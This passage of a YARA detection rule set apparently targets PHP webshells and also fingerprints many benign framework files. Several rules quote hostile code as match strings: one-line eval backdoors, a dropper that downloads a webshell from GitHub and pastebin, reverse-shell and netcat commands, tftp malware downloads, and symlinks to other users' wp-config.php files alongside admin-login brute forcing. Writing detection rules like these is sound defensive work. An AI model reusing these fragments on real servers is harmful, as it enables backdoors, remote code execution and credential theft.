      $s7 = "<info>php app/console sylius:user:promote matthieu@email.com</info>" fullword ascii
      $s8 = "namespace Sylius\\Bundle\\UserBundle\\Command;" fullword ascii
      $s9 = "$this->getEntityManager($input->getOption('user-type'))->flush();" fullword ascii
      $s10 = "new InputOption('super-admin', null, InputOption::VALUE_NONE, 'Set the user as a super admin')," fullword ascii
      $s11 = "class PromoteUserCommand extends AbstractRoleCommand" fullword ascii
      $s12 = "use Sylius\\Component\\User\\Model\\UserInterface;" fullword ascii
      $s13 = "new InputOption('user-type', null, InputOption::VALUE_REQUIRED, 'User type')," fullword ascii
      $s14 = "->setDescription('Promotes a user by adding roles.')" fullword ascii
      $s15 = "use Symfony\\Component\\Console\\Output\\OutputInterface;" fullword ascii
      $s16 = "use Symfony\\Component\\Console\\Input\\InputArgument;" fullword ascii
      $s17 = "use Symfony\\Component\\Console\\Input\\InputInterface;" fullword ascii
      $s18 = "use Symfony\\Component\\Console\\Input\\InputOption;" fullword ascii
      $s19 = "$output->writeln(sprintf('Security role <comment>%s</comment> has been added to user <comment>%s</comment>', $securityRole, (str" ascii
      $s20 = "new InputArgument('roles', InputArgument::IS_ARRAY, 'Security roles')," fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 6KB and
      1 of ($x*) and 4 of them
}

rule OsComPayLoad
{
   meta:
      description = "php22 - file OsComPayLoad.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "fb18ad21fa9f54f40b65db64d4b53ed225128c0e45920ab2344b3f3e15f6c2a5"
   strings:
      $x1 = "$text = http_get('https://raw.githubusercontent.com/phpshellxyz/webshell/master/upluad.php');" fullword ascii
      $s2 = "$text2 = http_get('https://pastebin.com/raw/880ufaWF');" fullword ascii
      $s3 = "$check = $_SERVER['DOCUMENT_ROOT'] . \"/install/includes/vuln.php\" ;" fullword ascii
      $s4 = "$check2 = $_SERVER['DOCUMENT_ROOT'] . \"/vuln.htm\" ;" fullword ascii
      $s5 = "function http_get($url){" fullword ascii
      $s6 = "return curl_exec($im);" fullword ascii
      $s7 = "curl_setopt($im, CURLOPT_HEADER, 0);" fullword ascii
      $s8 = "curl_setopt($im, CURLOPT_CONNECTTIMEOUT, 10);" fullword ascii
      $s9 = "curl_setopt($im, CURLOPT_RETURNTRANSFER, 1);" fullword ascii
      $s10 = "<title>Vuln!! patch it Now!</title>" fullword ascii
   condition:
      uint16(0) == 0x743c and filesize < 2KB and
      1 of ($x*) and all of them
}

rule php22_qiang14
{
   meta:
      description = "php22 - file qiang14.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "5376b8e48da83bb218093a76ed394c2ce36c3651e191acbc64dc415596855fac"
   strings:
      $s1 = "@preg_replace(\"/[email]/e\",$_POST['h'],\"error\");" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule php22_once
{
   meta:
      description = "php22 - file once.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "15c6ed1e1d3cf0630b9bd3cf3744a58ef40bfe87b2ab6324d3f5100337e9efff"
   strings:
      $s1 = "<?php $x=base64_decode(\"YXNzZXJ0\");$x($_POST['c']);?>" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule removepolicydata
{
   meta:
      description = "php22 - file removepolicydata.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "61cbcf3208c848d7273c0fd308f4d2ba9f4a2b737704b709d4cbf166eeaf8ee2"
   strings:
      $s1 = "* @subpackage processors.security.access.policy" fullword ascii
      $s2 = "if (!isset($ar[$scriptProperties['key']])) return $modx->error->failure($modx->lexicon('policy_err_nf'));" fullword ascii
      $s3 = "if (!isset($scriptProperties['id'])) return $modx->error->failure($modx->lexicon('policy_err_ns'));" fullword ascii
      $s4 = "$policy = $modx->getObject('modAccessPolicy',$scriptProperties['id']);" fullword ascii
      $s5 = "if (!$modx->hasPermission('policy_save')) return $modx->error->failure($modx->lexicon('permission_denied'));" fullword ascii
      $s6 = "* @param $key The key of the attribute data row" fullword ascii
      $s7 = "if ($policy == null) return $modx->error->failure($modx->lexicon('policy_err_nf'));" fullword ascii
      $s8 = "* @param $id The ID of the policy" fullword ascii
      $s9 = "/* get policy */" fullword ascii
      $s10 = "* Removes a policy attribute" fullword ascii
      $s11 = "return $modx->error->failure($modx->lexicon('policy_err_save'));" fullword ascii
      $s12 = "unset($ar[$scriptProperties['key']]);" fullword ascii
      $s13 = "* @package modx" fullword ascii
      $s14 = "$ar = $policy->get('data');" fullword ascii
      $s15 = "/* parse data from JSON */" fullword ascii
      $s16 = "return $modx->error->success();" fullword ascii
      $s17 = "/* save policy */" fullword ascii
      $s18 = "/* set policy value */" fullword ascii
      $s19 = "$policy->set('data',$modx->toJSON($ar));" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 3KB and
      8 of them
}

rule PrettyFormatter
{
   meta:
      description = "php22 - file PrettyFormatter.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "5de4da1b7af74c249a23a553f7fe2f24f72089bc53774bffe175baa1368e32b7"
   strings:
      $s1 = "* (c) Marcello Duarte <marcello.duarte@gmail.com>" fullword ascii
      $s2 = "* (c) Konstantin Kudryashov <ever.zet@gmail.com>" fullword ascii
      $s3 = "$io->write(sprintf('<broken>! %s</broken>', $title), $depth - 1);" fullword ascii
      $s4 = "$io->write(sprintf('<skipped>? %s</skipped>', $title), $depth - 1);" fullword ascii
      $s5 = "$io->write(sprintf('<pending>- %s</pending>', $title), $depth - 1);" fullword ascii
      $s6 = "$io->write(sprintf(\"%d examples \", $this->getStatisticsCollector()->getEventsCount()));" fullword ascii
      $s7 = "foreach ($this->getStatisticsCollector()->getCountsHash() as $type => $count) {" fullword ascii
      $s8 = "$io->writeln(sprintf(\"<%s>----  %s examples</%s>\\n\", $status, $status, $status));" fullword ascii
      $s9 = "$io->writeln(sprintf(\"\\n%sms\", round($event->getTime() * 1000)));" fullword ascii
      $s10 = "$io->writeln(sprintf(\"\\n%d specs\", $this->getStatisticsCollector()->getTotalSpecs()));" fullword ascii
      $s11 = "$message = $this->getPresenter()->presentException($exception, $io->isVerbose());" fullword ascii
      $s12 = "%s</failed>', $title), $depth - 1);" fullword ascii
      $s13 = "%s</passed>', $title), $depth - 1);" fullword ascii
      $s14 = "'failed' => $this->getStatisticsCollector()->getFailedEvents()," fullword ascii
      $s15 = "$io->writeln(sprintf('<failed>%s</failed>', lcfirst($message)), $depth);" fullword ascii
      $s16 = "* This file is part of PhpSpec, A php toolset to drive emergent" fullword ascii
      $s17 = "if (ExampleEvent::FAILED === $event->getResult()) {" fullword ascii
      $s18 = "str_replace('\\\\', DIRECTORY_SEPARATOR, $failEvent->getSpecification()->getTitle())" fullword ascii
      $s19 = "$line  = $event->getExample()->getFunctionReflection()->getStartLine();" fullword ascii
      $s20 = "'skipped' => $this->getStatisticsCollector()->getSkippedEvents()," fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 10KB and
      8 of them
}

rule php22_Rar
{
   meta:
      description = "php22 - file Rar.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "a4c097518922f814e2104827f3282799d9aa2329c001806320ad6df3adfaf313"
   strings:
      $s1 = "* Returns the set targetpath" fullword ascii
      $s2 = "* Compresses the given content" fullword ascii
      $s3 = "* Sets the targetpath to use" fullword ascii
      $s4 = "* Decompresses the given content" fullword ascii
      $s5 = "* Returns the set password" fullword ascii
      $s6 = "$target = str_replace(array('/', '\\\\'), DIRECTORY_SEPARATOR, $target);" fullword ascii
      $s7 = "throw new Zend_Filter_Exception(\"The directory '$target' does not exist\");" fullword ascii
      $s8 = "*     'target'   => Target to write the files to" fullword ascii
      $s9 = "* @param  string|array $content" fullword ascii
      $s10 = "* @version    $Id: Rar.php 20096 2010-01-06 02:05:09Z bkarwin $" fullword ascii
      $s11 = "* @param  string $content" fullword ascii
      $s12 = "* Compression adapter for Rar" fullword ascii
      $s13 = "* Sets the archive to use for de-/compression" fullword ascii
      $s14 = "* @see Zend_Filter_Compress_CompressAbstract" fullword ascii
      $s15 = "$this->_options['target'] = (string) $target;" fullword ascii
      $s16 = "$archive = str_replace(array('/', '\\\\'), DIRECTORY_SEPARATOR, realpath($content));" fullword ascii
      $s17 = "* Compression Options" fullword ascii
      $s18 = "*     'password' => Password to use" fullword ascii
      $s19 = "* @return Zend_Filter_Compress_Rar" fullword ascii
      $s20 = "if (!file_exists(dirname($target))) {" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 20KB and
      8 of them
}

rule ReCaptcha
{
   meta:
      description = "php22 - file ReCaptcha.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "07ab2c80a7d680b25d777d2b546d8b43de329599a1b12a0d41524cc450a96c69"
   strings:
      $x1 = "* @author Virgil-Adrian Teaca - virgil@giulianaeassociati.com" fullword ascii
      $s2 = "* @version 3.0" fullword ascii
      $s3 = "'secret'  => ''," fullword ascii
      $s4 = "'siteKey' => ''," fullword ascii
      $s5 = "* ReCaptcha" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      1 of ($x*) and all of them
}

rule php22_output3
{
   meta:
      description = "php22 - file output3.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "d5e63a4fbee1f3bd4dbb072ec1c5c63699a1f051d52252c979a7abb3980a1ac4"
   strings:
      $s1 = "$forward_reason = (int) get_input('forward_reason', ELGG_HTTP_OK);" fullword ascii
      $s2 = "_elgg_services()->responseFactory->redirect($forward_url, $forward_reason);" fullword ascii
      $s3 = "$forward_url = get_input('forward_url');" fullword ascii
      $s4 = "$error_message = get_input('error_message');" fullword ascii
      $s5 = "$system_message = get_input('system_message');" fullword ascii
      $s6 = "if ($forward_url || $forward_url === '') {" fullword ascii
      $s7 = "if ($forward_url === '-1') {" fullword ascii
      $s8 = "$forward_url = REFERRER;" fullword ascii
      $s9 = "$output = get_input('output');" fullword ascii
      $s10 = "system_message($system_message);" fullword ascii
      $s11 = "register_error($error_message);" fullword ascii
      $s12 = "if ($system_message) {" fullword ascii
      $s13 = "if ($error_message) {" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      8 of them
}

rule OrderTransitions
{
   meta:
      description = "php22 - file OrderTransitions.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "64365d7990cfe19ddcc0f386e282654ccd05824fdc736a04f3b5418e4cd3c7ef"
   strings:
      $s1 = "namespace Sylius\\Component\\Order;" fullword ascii
      $s2 = "public const TRANSITION_FULFILL = 'fulfill';" fullword ascii
      $s3 = "public const TRANSITION_CREATE = 'create';" fullword ascii
      $s4 = "public const GRAPH = 'sylius_order';" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule php22_qiang11
{
   meta:
      description = "php22 - file qiang11.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "4d02c1e7371f2ac1d4738402427244fd472c40f6d3ac11a7fa1f983b4a87cd67"
   strings:
      $s1 = "<?php assert($_POST[sb]);?>" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule PageContentIsRenderingTest
{
   meta:
      description = "php22 - file PageContentIsRenderingTest.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "34a8d06cbd674b3447428759c3a2a439b4c7a3d60fea1062d6b954d4cbb55730"
   strings:
      $s1 = "public function it_doesnt_alter_content_if_no_listeners()" fullword ascii
      $s2 = "Event::listen(PageContentIsRendering::class, function (PageContentIsRendering $event) {" fullword ascii
      $s3 = "$event->setBody('<strong>' . $event->getOriginal() . '</strong>');" fullword ascii
      $s4 = "class PageContentIsRenderingTest extends BasePageTest" fullword ascii
      $s5 = "use Modules\\Page\\Events\\PageContentIsRendering;" fullword ascii
      $s6 = "'template' => 'default'," fullword ascii
      $s7 = "$this->assertEquals('<strong>My Page Body</strong>', $page->body);" fullword ascii
      $s8 = "public function it_can_change_final_content()" fullword ascii
      $s9 = "$this->assertEquals('My Page Body', $page->body);" fullword ascii
      $s10 = "private function createPage()" fullword ascii
      $s11 = "/** @test */" fullword ascii
      $s12 = "use Illuminate\\Support\\Facades\\Event;" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 3KB and
      8 of them
}

rule page_controls_header
{
   meta:
      description = "php22 - file page_controls_header.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "346029f2867ff42d7272458bd317f9a42433e5334e792ad03c3d4fb9eb5c4617"
   strings:
      $s1 = "if (Config::get('concrete.misc.enable_progressive_page_reindex') && Config::get('concrete.misc.do_page_reindex_check')) {" fullword ascii
      $s2 = "if (Config::get('concrete.misc.enable_progressive_page_reindex') && Config::get('concrete.misc.do_page_reindex_check')) " fullword ascii
      $s3 = "$v->addFooterItem('<script type=\"text/javascript\">$(function() { jQuery.datepicker.setDefaults({dateFormat: \\'yy-mm-" fullword ascii
      $s4 = "ConcretePanelManager.register({'identifier': 'dashboard', 'position': 'right', url: '{$panelDashboard}'});" fullword ascii
      $s5 = "ConcretePanelManager.register({'identifier': 'page_relations', 'position': 'right', url: '{$panelRelations}'});" fullword ascii
      $s6 = "ConcretePanelManager.register({'identifier': 'check-in', 'position': 'left', url: '{$panelCheckIn}'});" fullword ascii
      $s7 = "ConcretePanelManager.register({'identifier': 'sitemap', 'position': 'right', url: '{$panelSitemap}'});" fullword ascii
      $s8 = "if (is_object($pagetype) && $pagetype->doesPageTypeLaunchInComposer()) {" fullword ascii
      $s9 = "$valt = Loader::helper('validation/token');" fullword ascii
      $s10 = "anager.getByIdentifier('page').show();\";" fullword ascii
      $s11 = "defined('C5_EXECUTE') or die(\"Access Denied.\");" fullword ascii
      $s12 = "if ($cp->canEditPageContents() && $request->get('ctask') == 'check-out-first') {" fullword ascii
      $s13 = "$v->addFooterItem('<script type=\"text/javascript\">$(function() { ccm_doPageReindexing(); });</script>');" fullword ascii
      $s14 = "<style type=\"text/css\">div.ccm-page {padding-top: 48px !important;} </style>" fullword ascii
      $s15 = "ConcretePanelManager.register({'identifier': 'page', url: '{$panelPage}'});" fullword ascii
      $s16 = "$dh = Loader::helper('concrete/dashboard');" fullword ascii
      $s17 = "$launchPageComposer = \"$('a[data-launch-panel=page]').toggleClass('ccm-launch-panel-active'); ConcretePanelM" fullword ascii
      $s18 = "$cih = Loader::helper('concrete/ui');" fullword ascii
      $s19 = "$token = '&' . $valt->getParameter();" fullword ascii
      $s20 = "echo \"var CCM_SECURITY_TOKEN = '\" . $valt->generate() . \"';\";" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 10KB and
      8 of them
}

rule OutputTestCase
{
   meta:
      description = "php22 - file OutputTestCase.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "00274556f1d7072d27765e4586efd93c0bef3571d077331209acc9880144bcbd"
   strings:
      $s1 = "public function testExpectOutputStringFooActualBar()" fullword ascii
      $s2 = "public function testExpectOutputRegexFooActualBar()" fullword ascii
      $s3 = "public function testExpectOutputRegexFooActualFoo()" fullword ascii
      $s4 = "public function testExpectOutputStringFooActualFoo()" fullword ascii
      $s5 = "$this->expectOutputString('foo');" fullword ascii
      $s6 = "$this->expectOutputRegex('/foo/');" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule phpFloat
{
   meta:
      description = "php22 - file phpFloat.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "a5fdb015b5f75f0d8254dcfef57ad0e3bcace0afeed1ff6488c1425878fadd81"
   strings:
      $s1 = "$this->fail(($failMessage ?: $this->_('%s is not nearly equal to %s with epsilon %s', $this, $this->getTypeO" fullword ascii
      $s2 = "$epsilon = pow(10, - ini_get('precision'));" fullword ascii
      $s3 = "// see http://www.floating-point-gui.de/errors/comparison/ for more informations" fullword ascii
      $s4 = "$offset = abs($absCurrentValue - $absValue);" fullword ascii
      $s5 = "public function isNearlyEqualTo($value, $epsilon = null, $failMessage = null)" fullword ascii
      $s6 = "$this->fail($this->_('%s is not a float', $this));" fullword ascii
      $s7 = "$this->fail(($failMessage ?: $this->_('%s is not nearly equal to %s with epsilon %s', $this, $this->getTypeOf($value), $epsilon)" ascii
      $s8 = "return $this->isEqualTo(0.0, $failMessage);" fullword ascii
      $s9 = "public function isZero($failMessage = null)" fullword ascii
      $s10 = "case $absCurrentValue * $absValue == 0 && $offset >= pow($epsilon, 2):" fullword ascii
      $s11 = "case $offset / ($absCurrentValue + $absValue) >= $epsilon:" fullword ascii
      $s12 = "f($value), $epsilon)) . PHP_EOL . $this->diff($value));" fullword ascii
      $s13 = "if ($this->analyzer->isFloat($this->value) === true) {" fullword ascii
      $s14 = "if ($offsetIsNaN === false && $epsilon === null) {" fullword ascii
      $s15 = "if ($this->valueIsSet()->value !== $value) {" fullword ascii
      $s16 = "return $this->isEqualTo($value);" fullword ascii
      $s17 = "namespace mageekguy\\atoum\\asserters;" fullword ascii
      $s18 = "$absCurrentValue = abs($this->value);" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 4KB and
      8 of them
}

rule php22_pas
{
   meta:
      description = "php22 - file pas.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "d584a129845dc3a3b380bad24481e8ec5abd38f9bc67eb05c909edbb46b7a1d0"
   strings:
      $s1 = "lk9UiLvl/sjTbD7wXIRC+oEFyzzAPKttv8ex7ilFNlJ+nMwEnK7+QsBL6k5fE3WDBMC4xLoF8Hs/kZp6" fullword ascii
      $s2 = "EMSYShVyEyezJGqO68mLal3NGdXZNa/fBmPvsaCV32AJNVph6n5jcf8/eyw73BkgvXg0DEXpjtlI1QGC" fullword ascii
      $s3 = "WxJ4QZ4FjXPnf/qoJQZiVRO6tWblhC7ju1T5oiHud08BIcQ799DNhIfX+iaxqDLLJO5gS3Qvl+gQmJHj" fullword ascii
      $s4 = "0mdgx8xngHqGlOEReZ8PvvpIb/izKnJ8Wc2hOIRcE2IBX+g+Js3TZn19io5z7CKJXHkWnkQ5+hoSFQkn" fullword ascii
      $s5 = "XlOGgoIqGVWVayZvjHbCNDR0/Qw4aZ+IBUEdCJv3mVHnHQ5dTqq2gG5FhzcZFxYx6iovWcziGpfnZ+aI" fullword ascii
      $s6 = "qAhvcjBwy2HHxB+EPFT/1MoFdrVQYhkQLUQmgqaxI4IrCJlReuxEZ44MQG4YNWgxmwG5So1oPbhm2Y7V" fullword ascii
      $s7 = "tmPq4QZaWvYa+fm1Gspsf10U1MlPBzPw+rfGQbwXpaZRoxC5XQHr2dI9nzWaDClQAztdcW8x0qPrgX6Z" fullword ascii
      $s8 = "E0Rkb6HYBwqkjTYNK6PAssAaNPuSsPKFNTpWF0GeJufqYhqIWVjF6sP4J1XASgJJTwgaJ7nyQ/0Lw7qk" fullword ascii
      $s9 = "qTCyk0G40SU248g5hujQcu597SReAdIh/RRD0fH4gj5p0jeTg4vZ874Lkw/5GiXf3mmMTZBYPr50kGXf" fullword ascii
      $s10 = "Us5yUAXf6bvMQTIhofPC//yQCBKZ/fW2lf8O6O5fDjAEiQqYlzxto9r2EEoMq6YlKAfT75klCB7SD3Ge" fullword ascii
      $s11 = "0iBJhBZBZTjqJE2o+wbMybZMjz20+FiNCfZrWclVEaQvCVEL5jkxO30ON/8SrPtvf3jWMmJi0ap//Og2" fullword ascii
      $s12 = "PwY6FAhCpW9PvkzZdRGCVG0Wd1JhFMZh0TASeGL+CS9JjHrRX//DXcu84FBs8AwmrAD6zdyQIsHO4ww5" fullword ascii
      $s13 = "kYuO4OED3u1MgkT7WM0h0+GHKiqi7vTf//oZCPYOiIIp+Iz3+hSF90da9t5ht4LhEe0+hOiK2M4E3tDG" fullword ascii
      $s14 = "();}} @header(\"Status: 404 Not Found\"); ?>" fullword ascii
      $s15 = "4AWKuOHY4GEdY0J/VZi/R/hRZzC5AFFfRfoUwZiRiO4UZu8ZhdixI/7Tm+67qa1eqwqTQHXYHnlEiHLs" fullword ascii
      $s16 = "uglw3QnYHbp7Xnxp/8/ry+S2mJN3v6uz2cbmoAHrXwCCzAWo9pR7sS5IYmuMIND/6zaFGLjiKIbklweK" fullword ascii
      $s17 = "H3mxMEPS60YD3Vg3Zs4rrtGdd5POVw79m3KB8FG5eD7XamQR4P3kBdSKD9d/d/CHL68QmizjNI1vx72U" fullword ascii
      $s18 = "YHWFZ1zuQSh8xOHRvuZ7LhSG+mlgPSsKsjxnvLvQ/ysFRv7b2tc/E3o+3bM2yW2xGNIJzOwMUunO05/p" fullword ascii
      $s19 = "sfOOsOG98wwQHjDzenbkrXAoARpgS0X60W7ZbM1mLpBfVTIEjAm7F6MQgbBoibZNNiIn8YVTweJsSq/e" fullword ascii
      $s20 = "W/Kl4OcQLiHOellZjW053O7ynqJk6rp2htYA/eIcY+hd51UK62S/1yDmtiVLhnYz+dWK35GhCdX24K6P" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 60KB and
      8 of them
}

rule PodsUpgrade_2_1_0
{
   meta:
      description = "php22 - file PodsUpgrade_2_1_0.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "d601896936bfeba35a28239b00e464cba36bfd1208628a626c9d972b7438368f"
   strings:
      $s1 = "if ( !in_array( $pod[ 'type' ], array( 'post_type', 'media', 'user', 'comment' ) ) )" fullword ascii
      $s2 = "delete_option( 'pods_framework_upgrade_' . str_replace( '.', '_', $this->version ) );" fullword ascii
      $s3 = "// Only target multi-select relationships" fullword ascii
      $s4 = "// Only target pods that are meta-enabled" fullword ascii
      $s5 = "$upgraded = get_option( 'pods_framework_upgraded' );" fullword ascii
      $s6 = "// if serialized (or array), save as individual meta items and save new order meta key" fullword ascii
      $s7 = "* @return array|bool|int|mixed|null|void" fullword ascii
      $s8 = "unset( $upgraded[ array_search( $this->version, $upgraded ) ] );" fullword ascii
      $s9 = "* @package Pods\\Upgrade" fullword ascii
      $s10 = "$relationship_fields = $this->api->load_fields( array( 'type' => array( 'pick', 'file' ) ) );" fullword ascii
      $s11 = "$single_multi = pods_var( $field[ 'type' ] . '_format_type', $field[ 'options' ], 'single' );" fullword ascii
      $s12 = "// Get and loop through relationship meta" fullword ascii
      $s13 = "update_option( 'pods_framework_upgraded', $upgraded );" fullword ascii
      $s14 = "$limit = (int) pods_var( $field[ 'type' ] . '_limit', $field[ 'options' ], 0 );" fullword ascii
      $s15 = "$migration_limit = (int) apply_filters( 'pods_upgrade_item_limit', 1500 );" fullword ascii
      $s16 = "$relationship_fields = $this->api->load_fields( array( 'type' => 'pick' ) );" fullword ascii
      $s17 = "if ( in_array( $this->version, $upgraded ) )" fullword ascii
      $s18 = "$pod = $this->api->load_pod( array( 'pod' => $field[ 'pod' ] ) );" fullword ascii
      $s19 = "$migration_limit = max( $migration_limit, 100 );" fullword ascii
      $s20 = "$this->update_progress( __FUNCTION__, $last_id );" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 8KB and
      8 of them
}

rule OperatorFactoryInterface
{
   meta:
      description = "php22 - file OperatorFactoryInterface.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "44cc738229effba5c9449a77f96b83a708693e642108c117c838a9c758c2e220"
   strings:
      $s1 = "use Pimcore\\DataObject\\Import\\ColumnConfig\\Operator\\OperatorInterface;" fullword ascii
      $s2 = "namespace Pimcore\\DataObject\\Import\\ColumnConfig\\Operator\\Factory;" fullword ascii
      $s3 = "public function build(\\stdClass $configElement, $context = null): OperatorInterface;" fullword ascii
      $s4 = "interface OperatorFactoryInterface" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 2KB and
      all of them
}

rule ProviderRecords
{
   meta:
      description = "php22 - file ProviderRecords.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "93d3725293a44ea5f1727d745b37fe715cf19e7a3ea3d16b822b50e788b548b9"
   strings:
      $s1 = "use ScriptFUSION\\Porter\\Provider\\Resource\\ProviderResource;" fullword ascii
      $s2 = "namespace ScriptFUSION\\Porter\\Collection;" fullword ascii
      $s3 = "* @return ProviderResource" fullword ascii
      $s4 = "public function __construct(\\Iterator $providerRecords, ProviderResource $resource)" fullword ascii
      $s5 = "parent::__construct($providerRecords);" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule php22_phpspy3
{
   meta:
      description = "php22 - file phpspy3.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "caf482e4a74cb0d079d9451bea04b888881a3909f4f6a0175e55eebc29f303c9"
   strings:
      $x1 = "echo Exec_Run('/tmp/spider_bc '.$_POST['yourip'].' '.$_POST['yourport'].' &') ? 'nc -l -n -v -p '.$_POST['yourport'] : '" fullword ascii
      $x2 = "$exe = @$shell->exec(\"cmd.exe /c \".$cmd);" fullword ascii
      $x3 = "Str[8] = \"tftp -i 219.134.46.245 get server.exe c:\\\\\\\\server.exe\";" fullword ascii
      $x4 = "Str[6] = \"tftp -i 219.134.46.245 get server.exe c:\\\\server.exe\";" fullword ascii
      $x5 = "$run = isset($_POST['run']) ? $_POST['run'] : 'cmd.exe';" fullword ascii
      $x6 = "if(md5($_POST['spiderpass']) == md5($password)){die('<meta http-equiv=\"refresh\" content=\"1;URL=?\">');}" fullword ascii
      $x7 = "<input type=\"text\" name=\"tcb\" id=\"tcb\" value=\"http://www.baidu.com/download/muma.exe\" style=\"width:500px;\">';" fullword ascii
      $x8 = "if(!empty($_POST['cmd'])){$res = Exec_Run($_POST['cmd']);$cmd = $_POST['cmd'];}" fullword ascii
      $x9 = "elseif(function_exists('passthru')){@ob_start();@passthru($cmd);$res = @ob_get_contents();@ob_end_clean();}" fullword ascii
      $x10 = "$query = \"INSERT into Spider_Temp_Tab values (CONVERT(\".$shellcode.\",CHAR));\";" fullword ascii
      $x11 = "echo Exec_Run($perlpath.' /tmp/spider_bc '.$_POST['yourip'].' '.$_POST['yourport'].' &') ? 'nc -l -n -v -p '.$_POST['yourport'] " ascii
      $x12 = "echo Exec_Run($perlpath.' /tmp/spider_bc '.$_POST['yourip'].' '.$_POST['yourport'].' &') ? 'nc -l -n -v -p '.$_POST['yourport'] " ascii
      $x13 = "$res = Exec_Run('gcc -o /tmp/angel_bc /tmp/angel_bc.c');" fullword ascii
      $x14 = "elseif(function_exists('system')){@ob_start();@system($cmd);$res = @ob_get_contents();@ob_end_clean();}" fullword ascii
      $x15 = "$adduser = \"-SETUSERSETUP\\r\\n\".\"-IP=0.0.0.0\\r\\n\".\"-PortNo=21\\r\\n\".\"-User=\".$_POST['user'].\"\\r\\n\".\"-Password=" ascii
      $x16 = ": &lt;script language=javascript src=\"http://www.baidu.com/ad.js?EMTDSU\"&gt;&lt;/script&gt;</div></div>" fullword ascii
      $x17 = "<div class=\"topbg\"> &nbsp; {$Server_IP} - {$Server_OS} - <a href=\"{$Server_Alexa}\" target=\"_blank\">Alexa</a></div>" fullword ascii
      $x18 = "$Com_durl = isset($_POST['durl']) ? $_POST['durl'] : 'http://www.baidu.com/down/muma.exe';" fullword ascii
      $x19 = "$cmd = isset($_POST['cmd']) ? $_POST['cmd'] : 'copy c:\\windows\\php.ini c:\\php.ini';" fullword ascii
      $x20 = "if(isset($_POST['mhost']) && isset($_POST['mport']) && isset($_POST['muser']) && isset($_POST['mpass']))" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 400KB and
      1 of ($x*)
}

rule Pinoy_LULZSecPrivateShell2017
{
   meta:
      description = "php22 - file Pinoy LULZSecPrivateShell2017.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "6e124a2026c6ef8724724bf9a0d8c7dcab2d858685a87a7091d85f701bef8e86"
   strings:
      $x1 = "document.location = 'http://www.pharmconseil-elearning.com/main/upload/Sql_injection_dengan_hackbar.pdf';" fullword ascii
      $x2 = "$s_my_ip = gethostbyname($_SERVER['HTTP_HOST']);$rsport = \"443\";$rsportb4 = $rsport;$rstarget4 = $s_my_ip;$s_result = \"<br><b" ascii
      $x3 = "$x=@file_get_contents('http://www.bing.com/search?q=ip%3A' . $ip . '+index.php?option=com&first=' . $npage);" fullword ascii
      $x4 = "echo\"<td>Not Found</td><td><a href='http://www.google.com/#hl=en&q=download+$comxx+joomla+extension'>Download</a></td></tr>\";" fullword ascii
      $x5 = "<center><p>Thanks To <a href=\"https://www.facebook.com/anton115\" target=\"_blank\">Cah_bagus</a></p></b></center>" fullword ascii
      $x6 = "curl_setopt($ch, CURLOPT_POSTFIELDS,\"username=admin&passwd=123456789&option=com_login&task=login&\".$hidden.\"=1\");" fullword ascii
      $x7 = "echo \"<center/><br/><b><font color=#FF0000>--==[ Command  Bypass Exploit ]==--</font></b><br>" fullword ascii
      $x8 = "{echo \"<p>\".$host.\" => <font color='red'>Error In Login Page !</font></p>\";ob_flush();flush();continue;}" fullword ascii
      $x9 = "document.location = 'http://199.91.153.192/3t115p2f6gvg/zvrrddmq6icqtd2/Metasploit_Toolkit.pdf';" fullword ascii
      $x10 = "$f = fopen(\"Result.txt\",\"a+\"); fwrite($f , \"Success ~~ $user:$pass -> $site/administrator/index.php\\n\"); fclose($f); " fullword ascii
      $x11 = "symlink('/home6/'.$usern.'/public_html/blog/wp-config.php',$pdomain.'~~Wordpress2.txt');" fullword ascii
      $x12 = "symlink('/home3/'.$usern.'/public_html/blog/wp-config.php',$pdomain.'~~Wordpress2.txt');" fullword ascii
      $x13 = "symlink('/home2/'.$usern.'/public_html/blog/wp-config.php',$pdomain.'~~Wordpress2.txt');" fullword ascii
      $x14 = "symlink('/home5/'.$usern.'/public_html/blog/wp-config.php',$pdomain.'~~Wordpress2.txt');" fullword ascii
      $x15 = "symlink('/home7/'.$usern.'/public_html/blog/wp-config.php',$pdomain.'~~Wordpress2.txt');" fullword ascii
